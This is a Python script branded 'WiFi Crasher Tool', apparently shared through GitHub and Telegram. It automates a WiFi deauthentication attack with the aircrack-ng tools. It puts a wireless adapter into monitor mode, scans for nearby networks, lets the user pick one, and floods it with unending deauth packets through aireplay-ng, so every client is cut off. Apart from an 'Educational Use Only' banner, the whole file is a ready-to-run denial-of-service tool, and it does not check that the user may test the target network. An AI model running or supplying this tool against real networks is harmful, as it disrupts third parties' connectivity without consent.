#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def print_color(text, color=Colors.WHITE, end='\n'):
    print(f"{color}{text}{Colors.RESET}", end=end)

def print_banner():
    ascii_art = rf"""{Colors.CYAN}
 /$$      /$$ /$$$$$$ /$$$$$$$$ /$$$$$$        /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$ 
| $$  /$ | $$|_  $$_/| $$_____/|_  $$_/       /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$  | $$| $$_____/| $$__  $$
| $$ /$$$| $$  | $$  | $$        | $$        | $$  \__/| $$  \ $$| $$  \ $$| $$  \__/| $$  | $$| $$      | $$  \ $$
| $$/$$ $$ $$  | $$  | $$$$$     | $$ /$$$$$$| $$      | $$$$$$$/| $$$$$$$$|  $$$$$$ | $$$$$$$$| $$$$$   | $$$$$$$/
| $$$$_  $$$$  | $$  | $$__/     | $$|______/| $$      | $$__  $$| $$__  $$ \____  $$| $$__  $$| $$__/   | $$__  $$
| $$$/ \  $$$  | $$  | $$        | $$        | $$    $$| $$  \ $$| $$  | $$ /$$  \ $$| $$  | $$| $$      | $$  \ $$
| $$/   \  $$ /$$$$$$| $$       /$$$$$$      |  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$/| $$  | $$| $$$$$$$$| $$  | $$
|__/     \__/|______/|__/      |______/       \______/ |__/  |__/|__/  |__/ \______/ |__/  |__/|________/|__/  |__/
                                                                                                                   
                                                                                                                   
                                                                                                                   {Colors.RESET}
"""
    
    border = f"{Colors.CYAN}{Colors.BOLD}{'═' * 60}{Colors.RESET}"
    
    title = f"{Colors.MAGENTA}{Colors.BOLD}📡 WiFi Crasher Tool v1.0{Colors.RESET}"
    warning = f"{Colors.YELLOW}Educational Use Only{Colors.RESET}"
    telegram = f"{Colors.GREEN}🔗 Telegram:{Colors.WHITE} https://t.me/A_t_o_m_ic{Colors.RESET}"
    github = f"{Colors.GREEN}🐙 GitHub:{Colors.WHITE} https://github.com/squidward404{Colors.RESET}"
    
    print(ascii_art)
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print(border)
    print(f"{Colors.CYAN}║{Colors.RESET} {title}")
    print(f"{Colors.CYAN}║{Colors.RESET} {warning}")
    print(border)
    print(f"{Colors.CYAN}║{Colors.RESET} {telegram}")
    print(f"{Colors.CYAN}║{Colors.RESET} {github}")
    print(border)
    print(f"{Colors.RESET}")

active_wireless_networks = []

def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True
    for item in lst:
        if essid and essid in item.get("ESSID", ""):
            return False
    return True

print_banner()

if not os.environ.get('SUDO_UID'):
    print_color("❌ Error: This script must be run with sudo!", Colors.RED)
    print_color("💡 Try: sudo python3 " + os.path.basename(__file__), Colors.YELLOW)
    exit(1)

for file_name in os.listdir():
    if file_name.endswith(".csv"):
        print_color(f"⚠️  Found .csv file: {file_name} - moving to backup/", Colors.YELLOW)
        directory = os.getcwd()
        os.makedirs(directory + "/backup/", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")

wlan_pattern = re.compile(r"^wl[a-z0-9]+", re.IGNORECASE)

def detect_interfaces():
    interfaces = []
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            found = wlan_pattern.findall(result.stdout)
            interfaces.extend(found)
    except:
        pass
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            iw_interfaces = re.findall(r'Interface\s+(\S+)', result.stdout)
            for iface in iw_interfaces:
                if wlan_pattern.match(iface) and iface not in interfaces:
                    interfaces.append(iface)
    except:
        pass
    return list(dict.fromkeys(interfaces))

print_color("🔍 Scanning for wireless interfaces...", Colors.CYAN)
check_wifi_result = detect_interfaces()

if not check_wifi_result:
    print_color("\n❌ No WiFi adapters detected!", Colors.RED)
    print_color("\n💡 Troubleshooting tips:", Colors.YELLOW)
    print_color("  1. Ensure your WiFi adapter supports monitor mode", Colors.WHITE)
    print_color("  2. Run: sudo rfkill unblock wifi", Colors.WHITE)
    print_color("  3. Install required tools: sudo apt install aircrack-ng wireless-tools iw", Colors.WHITE)
    print_color("  4. Try an external adapter (e.g., Alfa AWUS036NHA)", Colors.WHITE)
    exit(1)

print_color(f"\n✅ Found {len(check_wifi_result)} wireless interface(s):", Colors.GREEN)
for index, item in enumerate(check_wifi_result):
    print_color(f"   {Colors.BOLD}[{index}]{Colors.RESET} {Colors.CYAN}{item}{Colors.RESET}", Colors.WHITE)

while True:
    choice = input(f"\n{Colors.YELLOW}Select interface index (0-{len(check_wifi_result)-1}): {Colors.RESET}")
    try:
        idx = int(choice)
        if 0 <= idx < len(check_wifi_result):
            hacknic = check_wifi_result[idx]
            print_color(f"\n🎯 Selected: {Colors.BOLD}{hacknic}{Colors.RESET}", Colors.GREEN)
            break
        else:
            print_color("❌ Index out of range. Try again.", Colors.RED)
    except ValueError:
        print_color("❌ Please enter a valid number.", Colors.RED)

print_color("\n🔧 Killing conflicting processes...", Colors.CYAN)
subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print_color(f"\n📡 Putting {hacknic} into monitor mode...", Colors.CYAN)
try:
    subprocess.run(["ip", "link", "set", hacknic, "down"], check=True, capture_output=True)
    subprocess.run(["iw", hacknic, "set", "monitor", "none"], check=True, capture_output=True)
    subprocess.run(["ip", "link", "set", hacknic, "up"], check=True, capture_output=True)
    print_color("✅ Monitor mode enabled successfully!", Colors.GREEN)
except subprocess.CalledProcessError as e:
    print_color(f"❌ Failed to enable monitor mode: {e}", Colors.RED)
    print_color("💡 Your adapter/driver may not support monitor mode.", Colors.YELLOW)
    exit(1)

print_color(f"\n🔎 Starting scan on {hacknic}... (Press Ctrl+C when ready to attack)", Colors.CYAN)
scan_process = subprocess.Popen(
    ["airodump-ng", "-w", "scan", "--write-interval", "1", "--output-format", "csv", hacknic],
    stdout=subprocess.DEVNULL, 
    stderr=subprocess.DEVNULL
)

try:
    while True:
        subprocess.call("clear", shell=True)
        print_banner()
        
        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 
                     'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        
        for file_name in os.listdir():
            if file_name.startswith("scan") and file_name.endswith(".csv"):
                try:
                    with open(file_name, 'r', errors='ignore') as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row.get("BSSID") == "BSSID" or row.get("BSSID") == "Station MAC":
                                continue
                            essid = row.get("ESSID", "").strip()
                            if essid and check_for_essid(essid, active_wireless_networks):
                                active_wireless_networks.append(row)
                except:
                    continue
        
        print_color(f"\n{Colors.BOLD}{'No':<4} {'BSSID':<18} {'Ch':<4} {'ESSID'}{Colors.RESET}", Colors.CYAN)
        print_color("─" * 60, Colors.BLUE)
        
        if not active_wireless_networks:
            print_color("⏳ Scanning... waiting for networks to appear", Colors.YELLOW)
        else:
            for idx, net in enumerate(active_wireless_networks):
                bssid = net.get('BSSID', 'N/A')
                channel = net.get('channel', 'N/A').strip()
                essid = net.get('ESSID', '<hidden>').strip() or '<hidden>'
                power = net.get('Power', '-99')
                try:
                    pwr = int(power)
                    if pwr >= -50:
                        color = Colors.GREEN
                    elif pwr >= -70:
                        color = Colors.YELLOW
                    else:
                        color = Colors.RED
                except:
                    color = Colors.WHITE
                print(f"{Colors.BOLD}{idx:<4}{Colors.RESET} {bssid:<18} {channel:<4} {color}{essid}{Colors.RESET}")
        
        print_color(f"\n{Colors.YELLOW}📡 Scanning... Press Ctrl+C to select a target{Colors.RESET}")
        time.sleep(1)

except KeyboardInterrupt:
    print_color("\n\n⏹️  Scan stopped. Ready to select target.", Colors.CYAN)
    scan_process.terminate()
    scan_process.wait()

if not active_wireless_networks:
    print_color("❌ No networks captured. Exiting.", Colors.RED)
    exit(1)

while True:
    choice = input(f"{Colors.YELLOW}Select target index (0-{len(active_wireless_networks)-1}): {Colors.RESET}")
    try:
        idx = int(choice)
        if 0 <= idx < len(active_wireless_networks):
            break
        print_color("❌ Index out of range.", Colors.RED)
    except ValueError:
        print_color("❌ Please enter a valid number.", Colors.RED)

target = active_wireless_networks[idx]
hackbssid = target["BSSID"]
hackchannel = target["channel"].strip()
hackessid = target.get("ESSID", "<hidden>").strip() or "<hidden>"

print_color(f"\n🎯 Target selected:", Colors.GREEN)
print_color(f"   ESSID: {Colors.BOLD}{hackessid}{Colors.RESET}", Colors.WHITE)
print_color(f"   BSSID: {Colors.BOLD}{hackbssid}{Colors.RESET}", Colors.WHITE)
print_color(f"   Channel: {Colors.BOLD}{hackchannel}{Colors.RESET}", Colors.WHITE)

print_color(f"\n🔒 Locking to channel {hackchannel}...", Colors.CYAN)
subprocess.run(["airmon-ng", "start", hacknic, hackchannel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print_color(f"\n⚡ Starting deauth attack on {hackessid}...", Colors.RED + Colors.BOLD)
print_color(f"   Target: {hackbssid} | Interface: {hacknic}", Colors.WHITE)
print_color(f"   {Colors.YELLOW}Press Ctrl+C to stop the attack{Colors.RESET}\n")

try:
    subprocess.run([
        "aireplay-ng", 
        "--deauth", "0",
        "-a", hackbssid, 
        hacknic
    ])
except KeyboardInterrupt:
    print_color("\n\n✅ Attack stopped by user.", Colors.GREEN)

print_color("\n🏁 Script completed.", Colors.CYAN + Colors.BOLD)
